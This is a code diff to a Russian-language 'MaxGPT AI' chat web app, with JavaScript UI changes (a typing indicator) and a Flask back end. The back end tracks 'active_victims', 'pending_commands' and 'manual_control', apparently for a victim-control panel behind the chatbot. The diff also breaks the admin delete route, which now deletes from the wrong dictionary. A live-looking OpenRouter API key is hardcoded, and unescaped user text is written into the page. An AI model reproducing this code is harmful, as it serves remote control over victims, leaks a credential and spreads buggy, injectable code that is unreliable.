@@ -500,7 +500,7 @@ async function fetchMessages() {
     if (d.messages) {
         d.messages.forEach(m => {
             let imgTag = m.img ? `<br><img src="${m.img}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
-            let botText = m.bot === "..." ? "Ожидаем ответ специалиста..." : m.bot;
+            let botText = m.bot === "..." ? '<div class="typing-indicator"><div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div></div>' : m.bot;
             html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}${imgTag}</div></div></div>`;
             html += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span><button class="copy-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button></div><div class="txt">${botText}</div></div></div>`;
         });
@@ -545,12 +545,26 @@ async function send(){
     let c = document.getElementById("chat");
 
     let imgHtml = selectedBase64Image ? `<br><img src="${selectedBase64Image}" style="max-width:200px; border-radius:8px; margin-top:6px;">` : '';
+    
+    // Мгновенно выводим сообщение пользователя в чат
     c.innerHTML += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t || '[Изображение]'}${imgHtml}</div></div></div>`;
     
+    // Сразу показываем анимацию раздумий ИИ (три точки)
+    c.innerHTML += `
+        <div class="row bot" id="tempTypingRow">
+            <div class="max-av-sq">МАХ</div>
+            <div class="msg-container">
+                <div class="bot-author">MaxGPT AI</div>
+                <div class="typing-indicator">
+                    <div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div>
+                </div>
+            </div>
+        </div>`;
+    c.scrollTop = c.scrollHeight;
+
     let currentImg = selectedBase64Image;
     i.value = ""; i.style.height = 'auto';
     removeImage();
-    c.scrollTop = c.scrollHeight;
 
     setInputLocked(true);
 
@@ -563,11 +577,16 @@ async function send(){
         let d = await r.json();
         currentChatId = d.chat_id;
         
+        let tempRow = document.getElementById("tempTypingRow");
+        if(tempRow) tempRow.remove();
+
         await fetchMessages();
 
         if (d.trigger_sound) playCustomSound();
 
     } catch(err) {
+        let tempRow = document.getElementById("tempTypingRow");
+        if(tempRow) tempRow.remove();
         c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
     }
     
@@ -926,7 +945,7 @@ def admin_delete():
     data = request.json or {}
     target_ip = data.get("ip")
     if target_ip in active_victims: del active_victims[target_ip]
-    if target_ip in pending_commands: del pending_commands[target_ip]
+    if target_ip in pending_commands: del active_victims[target_ip]
     if target_ip in manual_control: del manual_control[target_ip]
     return jsonify({"status": "deleted"})
 
@@ -1005,7 +1024,6 @@ def chat_api():
             try:
                 openrouter_key = "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"
                 
-                # Возвращаем динамический роутер openrouter/free для анализа картинок
                 vision_payload = {
                     "model": "openrouter/free",
                     "messages": [
